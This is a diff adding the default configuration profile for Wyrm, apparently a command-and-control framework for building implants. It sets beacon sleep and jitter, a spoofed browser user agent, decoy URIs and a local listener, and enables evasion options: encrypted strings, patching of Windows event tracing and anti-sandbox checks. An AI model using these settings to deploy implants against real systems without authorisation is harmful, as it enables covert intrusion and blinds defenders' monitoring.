@@ -1,0 +1,43 @@
+# The default profile loaded into the Wyrm C2 for automated agent building
+
+sleep = 60 # A default value (in seconds) if not specified
+# If no UA is provided, it defaults to:
+# Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+useragent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
+
+[server]
+# The URI cannot match a download URI, the server will return an error
+# Currently only the first URI is accepted by the implant, but you may specify many.
+# v0.2 is going to ensure the implant can accept all specified URI's
+uri = ["/submit.aspx", "/login", "/about"]
+token = "a_default_token" # A default value if not specified in a listener - a catch all requirement
+# Optional, jitter time as a % of the max sleep time, if sleep is 10 seconds, setting jitter to 50% 
+# will cause the implant to check-in between every 5 seconds and 10 seconds.
+jitter = 50 
+
+# The listeners will allow the operator to define multiple C2 listening stations, either as 
+# a single C2 where this is installed, or using redirectors.
+# The user should be able to specify which listener they want to build for, with the listener name
+# being the key of the `listeners`, e.g. in the below would be `my_server_http` or `my_server_https`
+[listeners]
+
+# Right now you can only specify one listener, under the name 'default'
+# Multiple listener profiles are coming for v1.0
+[listeners.default]
+protocol = "http" # required
+address = "http://127.0.0.1" # required
+port = 8080 # required
+token = "my_unique_token"
+sleep = 5
+
+[implants]
+
+# Right now you can only specify one implant profile, under the name 'default'
+# Multiple implant profiles are coming for v1.0
+[implants.default]
+debug = false # Optional, true specifies a debug build - note this will also mean strings are not encrypted if set to true
+patch_etw = true # Optional, patches Events Tracing for Windows on the process
+
+[implants.default.anti_sandbox]
+ram = true # Optional
+trig = true # Optional
